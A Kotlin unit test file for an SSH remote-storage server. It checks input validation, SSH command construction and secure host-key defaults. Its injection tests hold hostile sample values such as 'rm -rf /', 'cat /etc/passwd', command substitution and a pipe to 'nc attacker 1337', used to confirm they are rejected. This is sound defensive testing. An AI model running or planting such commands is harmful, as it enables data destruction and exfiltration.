/*
 * Copyright Datadatdat.
 */

package com.datadatdat.remote.ssh.server

import com.datadatdat.remote.RemoteOperation
import com.datadatdat.remote.RemoteOperationType
import com.datadatdat.remote.RemoteProgress
import com.datadatdat.shell.CommandException
import com.datadatdat.shell.CommandExecutor
import io.kotest.assertions.throwables.shouldThrow
import io.kotest.core.spec.style.StringSpec
import io.kotest.core.test.TestCaseOrder
import io.kotest.matchers.shouldBe
import io.kotest.matchers.shouldNotBe
import io.mockk.Runs
import io.mockk.clearAllMocks
import io.mockk.every
import io.mockk.just
import io.mockk.mockk
import io.mockk.mockkStatic
import io.mockk.slot
import io.mockk.spyk
import io.mockk.unmockkAll
import io.mockk.verify
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.nio.file.Files
import kotlin.IllegalArgumentException

class SshRemoteServerTest :
    StringSpec({
        lateinit var server: SshRemoteServer
        lateinit var executor: CommandExecutor

        beforeTest {
            server = SshRemoteServer()
            executor = spyk(server.executor)
            server.executor = executor
        }

        afterTest {
            unmockkAll()
        }

        val operation =
            RemoteOperation(
                updateProgress = { _: RemoteProgress, _: String?, _: Int? -> Unit },
                remote = mapOf("username" to "user", "address" to "host", "path" to "/path"),
                parameters = mapOf("password" to "password"),
                operationId = "operation",
                commitId = "commit",
                commit = null,
                type = RemoteOperationType.PUSH,
            )

        "get provider returns ssh" {
            server.getProvider() shouldBe "ssh"
        }

        "validate remote succeeds with only required fields" {
            val result = server.validateRemote(mapOf("username" to "user", "path" to "/path", "address" to "host"))
            result["username"] shouldBe "user"
            result["path"] shouldBe "/path"
            result["address"] shouldBe "host"
        }

        "validate remote fails if required field is missing" {
            shouldThrow<IllegalArgumentException> {
                server.validateRemote(mapOf("username" to "user", "address" to "host"))
            }
        }

        "validate remote succeeds with all optional fields" {
            val result =
                server.validateRemote(
                    mapOf(
                        "username" to "user",
                        "path" to "/path",
                        "address" to "host",
                        "keyFile" to "/keyfile",
                        "password" to "pass",
                        "port" to 8022,
                    ),
                )
            result["username"] shouldBe "user"
            result["path"] shouldBe "/path"
            result["address"] shouldBe "host"
            result["password"] shouldBe "pass"
            result["keyFile"] shouldBe "/keyfile"
            result["port"] shouldBe 8022
        }

        "validate remote converts port" {
            val result =
                server.validateRemote(
                    mapOf(
                        "username" to "user",
                        "path" to "/path",
                        "address" to "host",
                        "port" to 8022.0,
                    ),
                )
            result["port"] shouldBe 8022
        }

        "validate remote fails with bad port" {
            shouldThrow<IllegalArgumentException> {
                server.validateRemote(
                    mapOf(
                        "username" to "user",
                        "path" to "/path",
                        "address" to "host",
                        "port" to "p",
                    ),
                )
            }
        }

        "validate remote fails with invalid property" {
            shouldThrow<IllegalArgumentException> {
                server.validateRemote(
                    mapOf(
                        "username" to "user",
                        "path" to "/path",
                        "address" to "host",
                        "portz" to "p",
                    ),
                )
            }
        }

        "validate params succeeds" {
            val params = server.validateParameters(mapOf("password" to "password", "key" to "key"))
            params["password"] shouldBe "password"
            params["key"] shouldBe "key"
        }

        "validate params fails for unknown property" {
            shouldThrow<IllegalArgumentException> {
                server.validateParameters(mapOf("password" to "password", "key" to "key", "keyz" to "key"))
            }
        }

        "ssh auth fails if neither password nor key is specified in parameters" {
            shouldThrow<IllegalArgumentException> {
                server.getSshAuth(emptyMap(), emptyMap())
            }
        }

        "ssh auth fails if both password and key is specified in parameters" {
            shouldThrow<IllegalArgumentException> {
                server.getSshAuth(emptyMap(), mapOf("password" to "password", "key" to "key"))
            }
        }

        "ssh auth returns password if specified in parameters" {
            val (password, key) = server.getSshAuth(emptyMap(), mapOf("password" to "password"))
            password shouldBe "password"
            key shouldBe null
        }

        "ssh auth returns password if specified in remote" {
            val (password, key) = server.getSshAuth(mapOf("password" to "password"), emptyMap())
            password shouldBe "password"
            key shouldBe null
        }

        "ssh auth returns key if specified in parameters" {
            val (password, key) = server.getSshAuth(emptyMap(), mapOf("key" to "key"))
            password shouldBe null
            key shouldBe "key"
        }

        // The bulk of the legacy fixture-based tests below set `skipHostCheck=true`
        // so they continue to exercise the pre-#60 command shape without having
        // to mock a per-test `known_hosts` file. Tests that specifically
        // exercise the new secure default live in the "Host-key verification"
        // section further down.

        "build SSH command uses sshpass for password authentication" {
            val file =
                kotlin.io.path
                    .createTempFile()
                    .toFile()
            try {
                val command =
                    server.buildSshCommand(
                        mapOf("skipHostCheck" to true),
                        mapOf("password" to "password"),
                        file,
                        false,
                    )
                command shouldBe
                    listOf(
                        "sshpass",
                        "-f",
                        file.path,
                        "ssh",
                        "-o",
                        "StrictHostKeyChecking=no",
                        "-o",
                        "UserKnownHostsFile=/dev/null",
                    )
                file.readText() shouldBe "password"
            } finally {
                file.delete()
            }
        }

        "build SSH command uses key file for key authentication" {
            val file =
                kotlin.io.path
                    .createTempFile()
                    .toFile()
            try {
                val command =
                    server.buildSshCommand(
                        mapOf("skipHostCheck" to true),
                        mapOf("key" to "key"),
                        file,
                        false,
                    )
                command shouldBe
                    listOf(
                        "ssh",
                        "-i",
                        file.path,
                        "-o",
                        "StrictHostKeyChecking=no",
                        "-o",
                        "UserKnownHostsFile=/dev/null",
                    )
                file.readText() shouldBe "key"
            } finally {
                file.delete()
            }
        }

        "build SSH command with port and address succeeds" {
            val file =
                kotlin.io.path
                    .createTempFile()
                    .toFile()
            try {
                val command =
                    server.buildSshCommand(
                        mapOf("port" to 1234, "username" to "user", "address" to "host", "skipHostCheck" to true),
                        mapOf("key" to "key"),
                        file,
                        true,
                        "ls",
                        "/var/tmp",
                    )
                command shouldBe
                    listOf(
                        "ssh",
                        "-i",
                        file.path,
                        "-p",
                        "1234",
                        "-o",
                        "StrictHostKeyChecking=no",
                        "-o",
                        "UserKnownHostsFile=/dev/null",
                        "user@host",
                        "ls",
                        "/var/tmp",
                    )
            } finally {
                file.delete()
            }
        }

        "run ssh command invokes executor correctly" {
            every { executor.exec(*anyVararg()) } returns ""
            server.runSsh(
                mapOf("username" to "user", "address" to "host", "skipHostCheck" to true),
                mapOf("key" to "key"),
                "ls",
                "-l",
            )
            verify {
                executor.exec(
                    "ssh",
                    "-i",
                    any(),
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "user@host",
                    "ls",
                    "-l",
                )
            }
        }

        "get commit returns failure if file doesn't exist" {
            every { executor.exec(*anyVararg()) } throws CommandException("", 1, "No such file or directory")
            val result = server.getCommit(mapOf("username" to "user", "address" to "host", "password" to "password"), emptyMap(), "id")
            result shouldBe null
        }

        "get commit propagates unknown failures" {
            every { executor.exec(*anyVararg()) } throws CommandException("", 1, "")
            shouldThrow<CommandException> {
                server.getCommit(mapOf("username" to "user", "address" to "host", "password" to "password"), emptyMap(), "id")
            }
        }

        "get commit returns correct metadata" {
            every { executor.exec(*anyVararg()) } returns "{\"a\":\"b\"}"
            val result = server.getCommit(mapOf("username" to "user", "address" to "host", "password" to "password"), emptyMap(), "id")
            result shouldNotBe null
            result!!["a"] shouldBe "b"
        }

        "temporary password file is correctly removed" {
            val slot = slot<String>()
            every { executor.exec("sshpass", "-f", capture(slot), *anyVararg()) } returns "{\"id\":\"id\",\"properties\":{\"a\":\"b\"}}"
            server.getCommit(mapOf("username" to "user", "address" to "host", "password" to "password"), emptyMap(), "id")
            val file = File(slot.captured)
            file.exists() shouldBe false
        }

        "list commits returns an empty list" {
            every { executor.exec(*anyVararg()) } returns ""
            val result =
                server.listCommits(
                    mapOf("username" to "user", "password" to "password", "address" to "host", "path" to "/var/tmp"),
                    emptyMap(),
                    emptyList(),
                )
            result.size shouldBe 0
        }

        "list commits returns correct metadata" {
            every {
                executor.exec(
                    "sshpass",
                    "-f",
                    any(),
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "root@localhost",
                    "ls",
                    "-1",
                    "/var/tmp",
                )
            } returns "a\nb\n"
            every {
                executor.exec(
                    "sshpass",
                    "-f",
                    any(),
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "root@localhost",
                    "cat",
                    "/var/tmp/a/metadata.json",
                )
            } returns
                "{\"timestamp\":\"2019-09-20T13:45:36Z\"}"
            every {
                executor.exec(
                    "sshpass",
                    "-f",
                    any(),
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "root@localhost",
                    "cat",
                    "/var/tmp/b/metadata.json",
                )
            } returns
                "{\"timestamp\":\"2019-09-20T13:45:37Z\"}"
            val result =
                server.listCommits(
                    mapOf(
                        "username" to "root",
                        "password" to "password",
                        "address" to "localhost",
                        "path" to "/var/tmp",
                        "skipHostCheck" to true,
                    ),
                    emptyMap(),
                    emptyList(),
                )
            result.size shouldBe 2
            result[0].first shouldBe "b"
            result[1].first shouldBe "a"
        }

        "list commits filters result" {
            every {
                executor.exec(
                    "sshpass",
                    "-f",
                    any(),
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "root@localhost",
                    "ls",
                    "-1",
                    "/var/tmp",
                )
            } returns "a\nb\n"
            every {
                executor.exec(
                    "sshpass",
                    "-f",
                    any(),
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "root@localhost",
                    "cat",
                    "/var/tmp/a/metadata.json",
                )
            } returns
                "{\"tags\":{\"c\":\"d\"}}"
            every {
                executor.exec(
                    "sshpass",
                    "-f",
                    any(),
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "root@localhost",
                    "cat",
                    "/var/tmp/b/metadata.json",
                )
            } returns
                "{}"
            val result =
                server.listCommits(
                    mapOf(
                        "username" to "root",
                        "password" to "password",
                        "address" to "localhost",
                        "path" to "/var/tmp",
                        "skipHostCheck" to true,
                    ),
                    emptyMap(),
                    listOf("c" to null),
                )
            result.size shouldBe 1
            result[0].first shouldBe "a"
        }

        "list commits ignores missing file" {
            every {
                executor.exec(
                    "sshpass",
                    "-f",
                    any(),
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "root@localhost",
                    "ls",
                    "-1",
                    "/var/tmp",
                )
            } returns "a\n"
            every {
                executor.exec(
                    "sshpass",
                    "-f",
                    any(),
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "root@localhost",
                    "cat",
                    "/var/tmp/a/metadata.json",
                )
            } throws
                CommandException(
                    "",
                    1,
                    "No such file or directory",
                )

            val result =
                server.listCommits(
                    mapOf(
                        "username" to "root",
                        "password" to "password",
                        "address" to "localhost",
                        "path" to "/var/tmp",
                        "skipHostCheck" to true,
                    ),
                    emptyMap(),
                    emptyList(),
                )
            result.size shouldBe 0
        }

        "write file succeeds" {
            val spy = spyk(server)
            every { spy.buildSshCommand(any(), any(), any(), any(), *anyVararg()) } returns emptyList()
            val process: Process = mockk()
            every { executor.start(*anyVararg()) } returns process
            every { executor.checkResult(any()) } just Runs
            val output = ByteArrayOutputStream()
            every { process.outputStream } returns output
            every { process.isAlive } returns false
            every { process.waitFor(any(), any()) } returns true

            spy.writeFileSsh(emptyMap(), emptyMap(), "/path", "content")

            output.toString() shouldBe "content"
        }

        "write file fails on timeout" {
            val spy = spyk(server)
            every { spy.buildSshCommand(any(), any(), any(), any(), *anyVararg()) } returns emptyList()
            val process: Process = mockk()
            every { executor.start(*anyVararg()) } returns process
            every { executor.checkResult(any()) } just Runs
            val output = ByteArrayOutputStream()
            every { process.outputStream } returns output
            every { process.isAlive } returns true
            every { process.waitFor(any(), any()) } returns true

            shouldThrow<IOException> {
                spy.writeFileSsh(emptyMap(), emptyMap(), "/path", "content")
            }
        }

        "get remote path returns correct information" {
            val result = server.getRemotePath(operation, null, "volume")
            result shouldBe "user@host:/path/commit/data/volume/"
        }

        "push metadata writes correct contents" {
            val spy = spyk(server)
            every { spy.writeFileSsh(any(), any(), any(), any()) } just Runs
            spy.pushMetadata(operation, mapOf("a" to "b"), true)
            verify {
                spy.writeFileSsh(any(), any(), "/path/commit/metadata.json", "{\"a\":\"b\"}")
            }
        }

        "get rsync creates directory on push" {
            val spy = spyk(server)
            every { spy.runSsh(any(), any(), *anyVararg()) } returns ""
            every { spy.getSshAuth(any(), any()) } returns Pair("password", null)
            spy.getRsync(operation, null, "/src", "user@host:/path/commit/volume", executor)
            verify {
                spy.runSsh(any(), any(), "mkdir", "-p", "/path/commit/volume")
            }
        }

        "get rsync does not create directory on pull" {
            val pullOperation =
                RemoteOperation(
                    updateProgress = { _: RemoteProgress, _: String?, _: Int? -> Unit },
                    remote = mapOf("username" to "user", "address" to "host", "path" to "/path"),
                    parameters = mapOf("password" to "password"),
                    operationId = "operation",
                    commitId = "commit",
                    commit = null,
                    type = RemoteOperationType.PULL,
                )
            val spy = spyk(server)
            every { spy.runSsh(any(), any(), *anyVararg()) } returns ""
            every { spy.getSshAuth(any(), any()) } returns Pair("password", null)
            spy.getRsync(pullOperation, null, "/src", "user@host:/path/commit/volume", executor)
            verify(exactly = 0) {
                spy.runSsh(any(), any(), "mkdir", "-p", any())
            }
        }

        "validate params with null returns empty map" {
            val params = server.validateParameters(null)
            params.size shouldBe 0
        }

        "sync data start does nothing" {
            server.syncDataStart(operation)
        }

        "sync data end does nothing" {
            server.syncDataEnd(operation, null, true)
        }

        // --- Security: command injection / unvalidated input -------------------

        "get commit rejects malicious commitId with shell metacharacters" {
            // Verify the executor is NEVER invoked for malicious commit IDs:
            // validation must reject the input before it reaches any shell.
            every { executor.exec(*anyVararg()) } returns ""
            val malicious =
                listOf(
                    "id\"; rm -rf /; echo \"",
                    "id; cat /etc/passwd",
                    "id`whoami`",
                    "id\$(id)",
                    "id && echo pwned",
                    "id | nc attacker 1337",
                    "../../etc/passwd",
                    "id\nrm -rf /",
                    "",
                )
            for (commitId in malicious) {
                shouldThrow<IllegalArgumentException> {
                    server.getCommit(
                        mapOf("username" to "user", "address" to "host", "password" to "password", "path" to "/path"),
                        emptyMap(),
                        commitId,
                    )
                }
            }
            verify(exactly = 0) { executor.exec(*anyVararg()) }
        }

        "get commit accepts well-formed commitIds" {
            every { executor.exec(*anyVararg()) } returns "{}"
            val valid = listOf("abc123", "commit.id", "commit_id", "commit-id", "ABC-123_v1.0")
            for (commitId in valid) {
                server.getCommit(
                    mapOf("username" to "user", "address" to "host", "password" to "password", "path" to "/path"),
                    emptyMap(),
                    commitId,
                ) shouldNotBe null
            }
        }

        "list commits skips entries with malicious names rather than executing them" {
            // ls returns one well-formed entry and one malicious entry. The
            // malicious entry must be filtered out without ever reaching the
            // `cat` shell command for that name.
            every {
                executor.exec(
                    "sshpass",
                    "-f",
                    any(),
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "root@localhost",
                    "ls",
                    "-1",
                    "/var/tmp",
                )
            } returns "good\nevil\"; rm -rf /; echo \"\n"
            every {
                executor.exec(
                    "sshpass",
                    "-f",
                    any(),
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "root@localhost",
                    "cat",
                    "/var/tmp/good/metadata.json",
                )
            } returns "{}"
            val result =
                server.listCommits(
                    mapOf(
                        "username" to "root",
                        "password" to "password",
                        "address" to "localhost",
                        "path" to "/var/tmp",
                        "skipHostCheck" to true,
                    ),
                    emptyMap(),
                    emptyList(),
                )
            result.size shouldBe 1
            result[0].first shouldBe "good"
            // Crucially: cat must NEVER be invoked with the malicious path.
            verify(exactly = 0) {
                executor.exec(
                    *anyVararg(),
                    "cat",
                    "/var/tmp/evil\"; rm -rf /; echo \"/metadata.json",
                )
            }
        }

        "write file ssh rejects malicious path with shell metacharacters" {
            // writeFileSsh interpolates `path` into `sh -c "cat > $path"`. A
            // path containing shell metacharacters must be rejected before any
            // process is started.
            every { executor.start(*anyVararg()) } returns mockk()
            val malicious =
                listOf(
                    "/tmp/foo\"; rm -rf /tmp/\"",
                    "/tmp/foo;rm -rf /",
                    "/tmp/foo`whoami`",
                    "/tmp/foo\$(id)",
                    "/tmp/foo && echo pwned",
                    "/tmp/foo | nc attacker 1337",
                    "/tmp/foo\nrm -rf /",
                )
            for (path in malicious) {
                shouldThrow<IllegalArgumentException> {
                    server.writeFileSsh(
                        mapOf("username" to "user", "address" to "host", "password" to "password"),
                        emptyMap(),
                        path,
                        "content",
                    )
                }
            }
            verify(exactly = 0) { executor.start(*anyVararg()) }
        }

        "write file ssh wraps safe paths in single quotes for sh -c" {
            // Even allowlisted paths are single-quoted as defense-in-depth so
            // any future relaxation of the allowlist still cannot break out of
            // `sh -c "cat > '<path>'"`. Verify the literal command shape by
            // capturing the args handed to the executor.
            val argSlot = slot<Array<String>>()
            every { executor.start(*varargAll { true }) } answers {
                @Suppress("UNCHECKED_CAST")
                argSlot.captured = invocation.args[0] as Array<String>
                mockk {
                    every { outputStream } returns ByteArrayOutputStream()
                    every { isAlive } returns false
                    every { waitFor(any(), any()) } returns true
                }
            }
            every { executor.checkResult(any()) } just Runs

            server.writeFileSsh(
                mapOf("username" to "user", "address" to "host", "password" to "password"),
                emptyMap(),
                "/path/commit/metadata.json",
                "content",
            )

            // Last arg passed to ssh is the `cat > '<path>'` shell payload.
            argSlot.captured.last() shouldBe "cat > '/path/commit/metadata.json'"
        }

        "shellSingleQuote escapes embedded single quotes" {
            // Unit test the helper directly so the escaping logic is covered
            // even though the allowlist currently rejects paths containing '.
            SshRemoteServer.shellSingleQuote("plain") shouldBe "plain"
            SshRemoteServer.shellSingleQuote("it's") shouldBe "it'\\''s"
            SshRemoteServer.shellSingleQuote("''") shouldBe "'\\'''\\''"
        }

        "validateCommitId rejects empty and bad input" {
            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateCommitId("") }
            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateCommitId("a b") }
            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateCommitId("a/b") }
            // Well-formed ids do not throw.
            SshRemoteServer.validateCommitId("abc-1.0_v2")
        }

        "validateRemotePath rejects empty and bad input" {
            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateRemotePath("") }
            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateRemotePath("/tmp/foo bar") }
            shouldThrow<IllegalArgumentException> { SshRemoteServer.validateRemotePath("/tmp/foo;rm -rf /") }
            // Well-formed paths do not throw.
            SshRemoteServer.validateRemotePath("/var/tmp/commit/metadata.json")
        }

        // --- Host-key verification (issue #60 item #3) -------------------------
        //
        // Policy: default to verifying the remote host against a known_hosts file
        // (`~/.ssh/known_hosts` unless `knownHostsFile` overrides it). Provide
        // `skipHostCheck=true` as an explicit opt-out for trusted networks / CI.
        // This replaces the prior unconditional `StrictHostKeyChecking=no` +
        // `UserKnownHostsFile=/dev/null` (which is the textbook MITM footgun).

        "build SSH command defaults to StrictHostKeyChecking=yes and user known_hosts" {
            // No `skipHostCheck` set → secure default. The known_hosts path
            // defaults to `~/.ssh/known_hosts`. We assert the exact options
            // that go on the ssh command line.
            val file =
                kotlin.io.path
                    .createTempFile()
                    .toFile()
            try {
                val command = server.buildSshCommand(emptyMap(), mapOf("password" to "password"), file, false)
                val defaultKnownHosts = System.getProperty("user.home") + "/.ssh/known_hosts"
                command shouldBe
                    listOf(
                        "sshpass",
                        "-f",
                        file.path,
                        "ssh",
                        "-o",
                        "StrictHostKeyChecking=yes",
                        "-o",
                        "UserKnownHostsFile=$defaultKnownHosts",
                    )
            } finally {
                file.delete()
            }
        }

        "build SSH command with skipHostCheck=true disables host-key verification" {
            // Explicit opt-out: matches the pre-#60 production behavior.
            val file =
                kotlin.io.path
                    .createTempFile()
                    .toFile()
            try {
                val command =
                    server.buildSshCommand(
                        mapOf("skipHostCheck" to true),
                        mapOf("password" to "password"),
                        file,
                        false,
                    )
                command shouldBe
                    listOf(
                        "sshpass",
                        "-f",
                        file.path,
                        "ssh",
                        "-o",
                        "StrictHostKeyChecking=no",
                        "-o",
                        "UserKnownHostsFile=/dev/null",
                    )
            } finally {
                file.delete()
            }
        }

        "build SSH command with skipHostCheck=false uses secure defaults" {
            val file =
                kotlin.io.path
                    .createTempFile()
                    .toFile()
            try {
                val command =
                    server.buildSshCommand(
                        mapOf("skipHostCheck" to false),
                        mapOf("password" to "password"),
                        file,
                        false,
                    )
                val defaultKnownHosts = System.getProperty("user.home") + "/.ssh/known_hosts"
                command shouldBe
                    listOf(
                        "sshpass",
                        "-f",
                        file.path,
                        "ssh",
                        "-o",
                        "StrictHostKeyChecking=yes",
                        "-o",
                        "UserKnownHostsFile=$defaultKnownHosts",
                    )
            } finally {
                file.delete()
            }
        }

        "build SSH command accepts knownHostsFile override" {
            val file =
                kotlin.io.path
                    .createTempFile()
                    .toFile()
            try {
                val command =
                    server.buildSshCommand(
                        mapOf("knownHostsFile" to "/etc/datadatdat/known_hosts"),
                        mapOf("password" to "password"),
                        file,
                        false,
                    )
                command shouldBe
                    listOf(
                        "sshpass",
                        "-f",
                        file.path,
                        "ssh",
                        "-o",
                        "StrictHostKeyChecking=yes",
                        "-o",
                        "UserKnownHostsFile=/etc/datadatdat/known_hosts",
                    )
            } finally {
                file.delete()
            }
        }

        "build SSH command coerces skipHostCheck string \"true\" to boolean true" {
            // Provider configs may come from JSON where Map<String, Any> decodes
            // booleans as Boolean OR (depending on serializer) as String. Both
            // representations must produce the opt-out behavior.
            val file =
                kotlin.io.path
                    .createTempFile()
                    .toFile()
            try {
                val command =
                    server.buildSshCommand(
                        mapOf("skipHostCheck" to "true"),
                        mapOf("password" to "password"),
                        file,
                        false,
                    )
                command.contains("StrictHostKeyChecking=no") shouldBe true
                command.contains("UserKnownHostsFile=/dev/null") shouldBe true
            } finally {
                file.delete()
            }
        }

        "build SSH command coerces skipHostCheck string \"false\" to boolean false" {
            val file =
                kotlin.io.path
                    .createTempFile()
                    .toFile()
            try {
                val command =
                    server.buildSshCommand(
                        mapOf("skipHostCheck" to "false"),
                        mapOf("password" to "password"),
                        file,
                        false,
                    )
                command.contains("StrictHostKeyChecking=yes") shouldBe true
                command.contains("UserKnownHostsFile=/dev/null") shouldBe false
            } finally {
                file.delete()
            }
        }

        "validate remote accepts skipHostCheck Boolean true" {
            val result =
                server.validateRemote(
                    mapOf(
                        "username" to "user",
                        "path" to "/path",
                        "address" to "host",
                        "skipHostCheck" to true,
                    ),
                )
            result["skipHostCheck"] shouldBe true
        }

        "validate remote accepts skipHostCheck Boolean false" {
            val result =
                server.validateRemote(
                    mapOf(
                        "username" to "user",
                        "path" to "/path",
                        "address" to "host",
                        "skipHostCheck" to false,
                    ),
                )
            result["skipHostCheck"] shouldBe false
        }

        "validate remote accepts skipHostCheck String \"true\"" {
            val result =
                server.validateRemote(
                    mapOf(
                        "username" to "user",
                        "path" to "/path",
                        "address" to "host",
                        "skipHostCheck" to "true",
                    ),
                )
            result["skipHostCheck"] shouldBe true
        }

        "validate remote accepts skipHostCheck String \"false\"" {
            val result =
                server.validateRemote(
                    mapOf(
                        "username" to "user",
                        "path" to "/path",
                        "address" to "host",
                        "skipHostCheck" to "false",
                    ),
                )
            result["skipHostCheck"] shouldBe false
        }

        "validate remote rejects skipHostCheck with non-boolean value" {
            shouldThrow<IllegalArgumentException> {
                server.validateRemote(
                    mapOf(
                        "username" to "user",
                        "path" to "/path",
                        "address" to "host",
                        "skipHostCheck" to "yes",
                    ),
                )
            }
        }

        "validate remote accepts knownHostsFile property" {
            val result =
                server.validateRemote(
                    mapOf(
                        "username" to "user",
                        "path" to "/path",
                        "address" to "host",
                        "knownHostsFile" to "/etc/known_hosts",
                    ),
                )
            result["knownHostsFile"] shouldBe "/etc/known_hosts"
        }

        "run ssh translates host-key verification failure into actionable error" {
            // When ssh exits with the canonical "Host key verification failed."
            // message, we want callers to see a wrapped error that names the
            // affected host AND tells them how to recover.
            every {
                executor.exec(*anyVararg())
            } throws CommandException("", 255, "Host key verification failed.\r\n")
            val ex =
                shouldThrow<CommandException> {
                    server.runSsh(
                        mapOf("username" to "root", "address" to "remote.example.com"),
                        mapOf("password" to "p"),
                        "ls",
                    )
                }
            // The original CommandException is preserved but its `output` is
            // augmented with remediation guidance the operator can act on.
            ex.output.contains("ssh-keyscan") shouldBe true
            ex.output.contains("remote.example.com") shouldBe true
            ex.output.contains("skipHostCheck") shouldBe true
        }

        "run ssh host-key error references custom knownHostsFile path" {
            // When `knownHostsFile` is configured, the remediation message must
            // tell the operator to write to *that* file, not the default. Also
            // exercises the path where CommandException.message is null
            // (e.message ?: "ssh failed").
            every { executor.exec(*anyVararg()) } throws CommandException("", 255, "Host key verification failed.")
            val ex =
                shouldThrow<CommandException> {
                    server.runSsh(
                        mapOf(
                            "username" to "root",
                            "address" to "ci.example.com",
                            "knownHostsFile" to "/etc/datadatdat/known_hosts",
                        ),
                        mapOf("password" to "p"),
                        "ls",
                    )
                }
            ex.output.contains("/etc/datadatdat/known_hosts") shouldBe true
            ex.output.contains("ci.example.com") shouldBe true
        }

        "run ssh host-key error tolerates missing address" {
            // Pathological case: address absent from remote map. We still
            // produce a usable error rather than throwing NullPointerException.
            every { executor.exec(*anyVararg()) } throws CommandException("", 255, "Host key verification failed.")
            shouldThrow<CommandException> {
                server.runSsh(
                    // No "address" key. getSshAuth still works because password
                    // is supplied; the failing path is purely the error
                    // wrapper.
                    mapOf("username" to "root"),
                    mapOf("password" to "p"),
                    "ls",
                )
            }
        }

        "coerceBoolean rejects non-boolean non-string values" {
            // Direct unit test for the `else` branch of coerceBoolean — types
            // like Int or Double cannot be silently coerced.
            shouldThrow<IllegalArgumentException> {
                SshRemoteServer.coerceBoolean("skipHostCheck", 1)
            }
            shouldThrow<IllegalArgumentException> {
                SshRemoteServer.coerceBoolean("skipHostCheck", 0.0)
            }
        }

        "run ssh leaves unrelated failures untouched" {
            // Only the host-key error gets the special treatment; regular
            // failures must surface verbatim so callers like getCommit can
            // pattern-match on "No such file or directory" the way they always
            // have.
            every { executor.exec(*anyVararg()) } throws CommandException("", 1, "No such file or directory")
            val ex =
                shouldThrow<CommandException> {
                    server.runSsh(
                        mapOf("username" to "root", "address" to "host"),
                        mapOf("password" to "p"),
                        "cat",
                        "/missing",
                    )
                }
            ex.output shouldBe "No such file or directory"
        }

        // --- Rsync data-transfer host-key plumbing (issue #63) -----------------
        //
        // PR #62 made the metadata-reading SSH path (runSsh / writeFileSsh)
        // default-secure. The data-transfer path goes through `getRsync` →
        // `RsyncExecutor.run` and historically didn't respect the same
        // `skipHostCheck` / `knownHostsFile` properties: rsync's `-e ssh`
        // invocation was TOFU regardless of the operator's choice.
        //
        // These tests drive `RsyncExecutor.run()` end-to-end with a stubbed
        // `CommandExecutor` so we can capture the *actual* rsync command line
        // and assert that the SSH options inside `-e` reflect the remote's
        // host-key policy. Asserting on the constructor property alone would
        // not catch a regression that forgot to thread the field into the
        // rsync invocation; running through `run()` does.
        //
        // Helper: drive getRsync → run() and capture executor.start args.
        fun captureRsyncArgs(remote: Map<String, Any>): Array<String> {
            val capturingExecutor = mockk<CommandExecutor>(relaxed = true)
            val captured = slot<Array<String>>()
            val proc = mockk<Process>(relaxed = true)
            // Empty stdout makes processOutput return immediately; the
            // missing-summary check then throws CommandException, which we
            // ignore. By this point the args have already been captured.
            every { proc.inputStream } returns java.io.ByteArrayInputStream(ByteArray(0))
            every { proc.errorStream } returns java.io.ByteArrayInputStream(ByteArray(0))
            every { proc.waitFor() } returns 0
            every { proc.exitValue() } returns 0
            every { capturingExecutor.start(*varargAll { true }) } answers {
                @Suppress("UNCHECKED_CAST")
                captured.captured = invocation.args[0] as Array<String>
                proc
            }
            every { capturingExecutor.checkResult(any()) } just Runs

            val op =
                RemoteOperation(
                    updateProgress = { _: RemoteProgress, _: String?, _: Int? -> Unit },
                    remote = remote,
                    parameters = mapOf("password" to "password"),
                    operationId = "operation",
                    commitId = "commit",
                    commit = null,
                    type = RemoteOperationType.PULL, // PULL skips the mkdir runSsh call
                )
            val rsync = server.getRsync(op, null, "/src", "user@host:/dst", capturingExecutor)
            try {
                rsync.run()
            } catch (_: CommandException) {
                // Expected: synthetic empty stdout means the run can't find
                // its summary line. The args are still captured by then.
            }
            return captured.captured
        }

        // Helper: extract the `-e <ssh-command>` argument so individual tests
        // can assert on the SSH options independently of rsync's own flags.
        fun sshOptionString(args: Array<String>): String = args[args.indexOf("-e") + 1]

        "rsync command uses StrictHostKeyChecking=yes by default" {
            // No `skipHostCheck` on the remote → secure default. Assert on
            // the actual rsync `-e` payload so this catches both the
            // constructor plumbing AND the SDK's `run()` forwarding it into
            // the rsync command.
            val args =
                captureRsyncArgs(
                    mapOf("username" to "user", "address" to "host", "path" to "/path"),
                )
            val sshOpts = sshOptionString(args)
            sshOpts.contains("StrictHostKeyChecking=yes") shouldBe true
            sshOpts.contains("StrictHostKeyChecking=no") shouldBe false
            sshOpts.contains("UserKnownHostsFile=/dev/null") shouldBe false
        }

        "rsync command uses StrictHostKeyChecking=no when skipHostCheck=true" {
            // Explicit opt-out must reach the rsync data-transfer path, not
            // just the metadata path.
            val args =
                captureRsyncArgs(
                    mapOf(
                        "username" to "user",
                        "address" to "host",
                        "path" to "/path",
                        "skipHostCheck" to true,
                    ),
                )
            val sshOpts = sshOptionString(args)
            sshOpts.contains("StrictHostKeyChecking=no") shouldBe true
            sshOpts.contains("UserKnownHostsFile=/dev/null") shouldBe true
            sshOpts.contains("StrictHostKeyChecking=yes") shouldBe false
        }

